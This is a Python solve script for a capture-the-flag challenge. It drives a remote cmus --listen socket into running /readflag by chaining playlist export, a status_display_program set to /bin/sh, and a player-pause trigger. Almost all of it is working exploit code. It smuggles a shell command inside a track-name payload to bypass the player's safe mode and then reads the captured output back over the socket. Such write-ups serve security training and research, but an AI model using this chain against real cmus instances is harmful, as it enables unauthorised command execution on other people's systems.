#!/usr/bin/env python3
"""Remote DJ: drive a cmus --listen instance into running /readflag.

The remote socket runs cmus in safe mode, which blocks run/shell/save-to-file but
still allows `save ... -` (stdout). The chain is:

    pl-export  <file>      write the playlist (our track names) to a file
    set status_display_program=/bin/sh
    player-pause           -> /bin/sh status <status_text> url <track name> ...
                           -> sh executes the exported playlist as a script
    load -l /home/ctf/loot ; save -l -   -> print the flag back

usage: python3 solve.py <host> <port> [--plain]
"""
import socket
import ssl
import sys
import time

PAYLOAD = "http://127.0.0.1:9/; /readflag please give me the flag > /home/ctf/loot #"

COMMANDS = [
    "passwd correct-horse-battery-staple",
    "set skip_track_info=true",      # store arbitrary strings as tracks
    "add -p " + PAYLOAD,
    "save -p -",                     # show the playlist (allowed: stdout)
    "pl-export status",              # playlist -> ./status
    "set status_display_program=/bin/sh",
    "player-pause",                  # spawns /bin/sh status ...
    "load -l /home/ctf/loot",        # asynchronous worker job
]

host, port = sys.argv[1], int(sys.argv[2])
plain = "--plain" in sys.argv

sock = socket.create_connection((host, port), timeout=10)
if not plain:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(sock)

for cmd in COMMANDS:
    sock.sendall(cmd.encode() + b"\n")
    time.sleep(0.35)

time.sleep(2)                        # let the library load finish
sock.sendall(b"save -l -\n")
time.sleep(1)

sock.settimeout(3)
out = b""
try:
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        out += chunk
except (TimeoutError, ssl.SSLError):
    pass

print(out.decode(errors="replace"))
